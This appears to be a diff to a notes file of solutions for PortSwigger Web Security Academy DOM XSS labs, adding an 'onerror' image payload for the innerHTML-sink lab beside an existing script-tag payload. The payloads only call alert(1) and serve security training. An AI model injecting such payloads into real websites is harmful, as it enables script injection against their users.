@@ -13,6 +13,7 @@
     - Search `"</h1><script>alert(1)</script><h1>"` in the search box.
 
 4.  [DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
+    - Search `</span><img src=1 onerror=alert(1) /><span>` in the search box.
 
 5.  [DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
 
